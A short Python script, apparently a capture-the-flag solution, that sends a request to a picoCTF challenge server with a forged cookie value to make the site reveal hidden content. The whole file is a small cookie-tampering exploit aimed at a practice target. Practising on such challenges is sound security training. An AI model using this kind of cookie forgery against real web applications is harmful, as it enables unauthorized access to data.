# Tristan Gomez

import requests

s = requests.Session()

exploit_data = {
    'name' : 'snickerdoodle'
}

exploit_cookie = {
    'name' : '18'
}

resp = s.post("http://mercury.picoctf.net:21485/search", cookies=exploit_cookie, data=exploit_data)

print(resp.text)
